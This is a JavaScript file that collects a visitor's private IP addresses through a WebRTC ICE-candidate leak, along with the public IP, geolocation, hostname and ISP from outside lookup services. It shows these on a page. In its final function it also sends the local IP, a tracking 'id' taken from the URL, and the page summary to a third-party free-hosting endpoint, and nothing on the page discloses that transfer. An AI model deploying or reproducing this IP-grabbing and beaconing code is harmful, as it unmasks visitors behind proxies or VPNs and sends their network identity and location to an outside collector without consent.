/**
 * Get the user IP throught the webkitRTCPeerConnection
 * @param onNewIP {Function} listener function to expose the IP locally
 * @return undefined
 */
function getUserIP(onNewIP) { //  onNewIp - your listener function for new IPs
    //compatibility for firefox and chrome
    var myPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
    var pc = new myPeerConnection({
        iceServers: []
    }),
    noop = function() {},
    localIPs = {},
    ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/g,
    key;

    function iterateIP(ip) {
        if (!localIPs[ip]) onNewIP(ip);
        localIPs[ip] = true;
    }

     //create a bogus data channel
    pc.createDataChannel("");

    // create offer and set local description
    pc.createOffer(function(sdp) {
        sdp.sdp.split('\n').forEach(function(line) {
            if (line.indexOf('candidate') < 0) return;
            line.match(ipRegex).forEach(iterateIP);
        });
        
        pc.setLocalDescription(sdp, noop, noop);
    }, noop); 

    //listen for candidate events
    pc.onicecandidate = function(ice) {
        if (!ice || !ice.candidate || !ice.candidate.candidate || !ice.candidate.candidate.match(ipRegex)) return;
        ice.candidate.candidate.match(ipRegex).forEach(iterateIP);
    };
}
var ipData={};

$(document).ready(function(){$.getJSON("http://jsonip.com/?callback=?", function (data){/*document.getElementById("ipPublicaID").innerHTML = '<p>Ip Publica: <b>'+data.ip+'</b>';*/ipData.publicIP=data.ip;ipExtraData(data.ip);});});
function proxyCheck(){var proxyHeader = 'via';var req = new XMLHttpRequest();req.open('GET', document.location, false);req.send();var header = req.getResponseHeader(proxyHeader);if (header) {return true;}return false;}
function ipExtraData(dd){$.get("http://ipinfo.io",function(d){
    
    var ipType=validateIP(dd);if(ipType!=undefined&&ipType.error==undefined){ipType=' ('+ipType.str+')';}
    
    document.getElementById("ipPublicaTD").innerText=dd+ipType;
    document.getElementById("geoPaisTD").innerText=d.country;
    document.getElementById("geoRegionTD").innerText=d.region;
    document.getElementById("geoCiudadTD").innerText=d.city+' ('+d.postal+')';
    document.getElementById("ipHostTD").innerText=d.hostname;
    document.getElementById("ipEmpresaTD").innerText=d.org;
    /*document.getElementById("ipProxyTD").innerText=proxyCheck();*/
    //document.getElementById("ipInfo").innerHTML="<table border='1' align='center'><tr><td>Ip Privada</td><td id='ipPrivada'></td></tr><tr><td>Ip Publica</td><td>"+dd+"</td></tr><tr><td>Pais</td><td>"+d.country+"</td></tr><tr><td>Region</td><td>"+d.region+"</td></tr><tr><td>Ciudad</td><td>"+d.city+' ('+d.postal+")</td></tr><tr><td>Host</td><td>"+d.hostname+"</td></tr><tr><td>Empresa</td><td>"+d.org+"</td></tr><tr><td>Proxy</td><td id='proxyData'></td></tr></table>";
    getLocalIp();
    //document.getElementById("proxyData").innerHTML=proxyCheck();
    //proxyCheck2(dd);
    proxyData();
},"jsonp");}
function getLocalIp(){
    getUserIP(function(ip){
        var ipType=validateIP(ip);if(ipType!=undefined&&ipType.error==undefined){ipType=' ('+ipType.str+')';}
        document.getElementById("ipPrivadaTD").innerText=ip+ipType;
        ipData.localIp=ip+ipType;
    });
}
function proxyCheck2(d){$.get('https://ipstack.com/ipstack_api.php?ip='+d+'&callback=console.info',function(ddd){console.log([ddd])},"jsonp");};

function myIP(url){if(window.XMLHttpRequest) xmlhttp = new XMLHttpRequest();else xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");xmlhttp.open("GET",url,false);xmlhttp.send();console.log('data recibida: ',xmlhttp.responseText);return false;}

function proxyData(){
    var localIp='';
    if(ipData.localIp!=undefined&&ipData.localIp!=''){localIp='&localIp='+ipData.localIp;}

    var localId=parse_query_string(window.location.search.substring(1))['id'];
    if (localId!=undefined&&localId!=''){localId='&id='+localId;}else{localId='';}
    
    var parsedData=document.getElementById("resumen").innerText;
    parsedData=strReplaceAll(parsedData,'|','_')
    if (parsedData!=undefined&&parsedData!=''){parsedData='&pd='+parsedData;}else{parsedData='';}
    
    $.get('https://nekro-sandbox.000webhostapp.com/ip.php?callback=jsonResponse'+localId+localIp+parsedData,function(ddd){jsonResponse(ddd)},"jsonp");
};
